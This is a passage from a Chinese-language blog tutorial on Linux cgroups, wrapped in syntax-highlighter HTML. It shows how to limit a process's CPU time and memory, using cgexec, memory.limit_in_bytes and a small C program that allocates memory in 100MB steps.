class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab670d01ef5882990645-9\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d01ef5882990645-10\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0014 seconds] -->\r\n\n</div>\n<p>保存为文件 cputime.c 编译并通过不同的方式执行：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d01ef9165290600\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ gcc cputime.c -o cputime\r\n$ sudo su\r\n$ time ./cputime\r\n$ time cgexec -g cpu:nick_cpu ./cputime</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d01ef9165290600-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d01ef9165290600-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d01ef9165290600-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d01ef9165290600-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d01ef9165290600-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">gcc </span><span class=\"crayon-v\">cputime</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">c</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">o</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">cputime</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d01ef9165290600-2\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sudo </span><span class=\"crayon-i\">su</span></div><div class=\"crayon-line\" id=\"crayon-5bab670d01ef9165290600-3\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">time</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">cputime</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d01ef9165290600-4\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">time </span><span class=\"crayon-v\">cgexec</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">g</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">cpu</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">nick</span><span class=\"crayon-sy\">_</span>cpu<span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">cputime</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0011 seconds] -->\r\n\n</div>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/08/9d85f99ab6b3de2209e81c6ec607f491.png\" alt=\"\"></p>\n<p>time 命令可以为我们报告程序执行消耗的时间，其中的 real 就是我们真实感受到的时间。使用 cgexec 能够把我们添加的 cgroup 配置 nick_cpu 应用到运行 cputime 程序的进程上。 上图显示，默认的执行只需要 2s 左右。通过 cgroups 限制 CPU 资源后需要运行 23s。</p>\n<h1>demo：限制进程可用的内存</h1>\n<p>这次我们来限制进程可用的最大内存，在 /sys/fs/cgroup/memory 下创建目录nick_memory：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d01efc980431966\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ cd  /sys/fs/cgroup/memory\r\n$ sudo mkdir nick_memory</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d01efc980431966-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d01efc980431966-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d01efc980431966-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">cd</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sys</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">fs</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">cgroup</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">memory</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d01efc980431966-2\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sudo </span><span class=\"crayon-e\">mkdir </span><span class=\"crayon-v\">nick_memory</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n\n</div>\n<p>下面的设置把进程的可用内存限制在最大 300M，并且不使用 swap：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d01eff188616632\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# 物理内存 + SWAP &lt;= 300 MB；1024*1024*300 = 314572800\r\n$ sudo su\r\n$ echo 314572800 &gt; nick_memory/memory.limit_in_bytes\r\n$ echo 0 &gt; nick_memory/memory.swappiness</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d01eff188616632-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d01eff188616632-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d01eff188616632-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d01eff188616632-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d01eff188616632-1\"><span class=\"crayon-p\"># 物理内存 + SWAP &lt;= 300 MB；1024*1024*300 = 314572800</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d01eff188616632-2\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sudo </span><span class=\"crayon-i\">su</span></div><div class=\"crayon-line\" id=\"crayon-5bab670d01eff188616632-3\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">314572800</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nick_memory</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">memory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">limit_in</span><span class=\"crayon-sy\">_</span>bytes</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d01eff188616632-4\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nick_memory</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">memory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">swappiness</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0012 seconds] -->\r\n\n</div>\n<p>然后创建一个不断分配内存的程序，它分五次分配内存，每次申请 100M：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d01f03999812142\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n#include &lt;stdio.h&gt;\r\n#include &lt;stdlib.h&gt;\r\n#include &lt;string.h&gt;\r\n\r\n#define CHUNK_SIZE 1024 * 1024 * 100\r\n\r\nvoid main()\r\n{\r\n    char *p;\r\n    int i;\r\n\r\n    for(i = 0; i &lt; 5; i ++)\r\n    {\r\n        p = malloc(sizeof(char) * CHUNK_SIZE);\r\n        if(p == NULL)\r\n        {\r\n            printf(\"fail to malloc!\");\r\n            return ;\r\n        }\r\n        // memset() 函数用来将指定内存的前 n 个字节设置为特定的值\r\n        memset(p, 0, CHUNK_SIZE);\r\n        printf(\"malloc memory %d MB\\n\", (i + 1) * 100);\r\n    }\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d01f03999812142-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d01f03999812142-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d01f03999812142-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d01f03999812142-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d01f03999812142-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d01f03999812142-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d01f03999812142-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d01f03999812142-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d01f03999812142-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d01f03999812142-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d01f03999812142-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d01f03999812142-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d01f03999812142-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d01f03999812142-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d01f03999812142-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d01f03999812142-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d01f03999812142-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d01f03999812142-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d01f03999812142-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d01f03999812142-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d01f03999812142-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d01f03999812142-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d01f03999812142-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d01f03999812142-24\">24</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d01f03999812142-1\"><span class=\"crayon-p\">#include &lt;stdio.h&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d01f03999812142-2\"><span class=\"crayon-p\">#include &lt;stdlib.h&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5bab670d01f03999812142-3\"><span class=\"crayon-p\">#include &lt;string.h&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d01f03999812142-4\"> </div><div class=\"crayon-line\" id=\"crayon-5bab670d01f03999812142-5\"><span class=\"crayon-p\">#define CHUNK_SIZE 1024 * 1024 * 100</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d01f03999812142-6\"> </div><div class=\"crayon-line\" id=\"crayon-5bab670d01f03999812142-7\"><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">main</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d01f03999812142-8\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5bab670d01f03999812142-9\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">char</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">p</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d01f03999812142-10\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab670d01f03999812142-11\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d01f03999812142-12\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab670d01f03999812142-13\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d01f03999812142-14\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">malloc</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">sizeof</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">char</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">CHUNK_SIZE</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab670d01f03999812142-15\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d01f03999812142-16\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5bab670d01f03999812142-17\"><span class=\"crayon-h\">            </span><span class=\"crayon-e\">printf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"fail to malloc!\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d01f03999812142-18\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab670d01f03999812142-19\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d01f03999812142-20\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">// memset() 函数用来将指定内存的前 n 个字节设置为特定的值</span></div><div class=\"crayon-line\" id=\"crayon-5bab670d01f03999812142-21\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">memset</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">p</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">CHUNK_SIZE</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d01f03999812142-22\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">printf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"malloc memory %d MB\\n\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">100</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab670d01f03999812142-23\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d01f03999812142-24\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0030 seconds] -->\r\n\n</div>\n<p>把上面的代码保存为 mem.c 文件，然后编译：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d01f06437609623\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ gcc mem.c -o mem</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d01f06437609623-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d01f06437609623-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">gcc </span><span class=\"crayon-v\">mem</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">c</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">o</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">mem</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n\n</div>\n<p>执行生成的 mem 程序：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d01f09103486706\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div 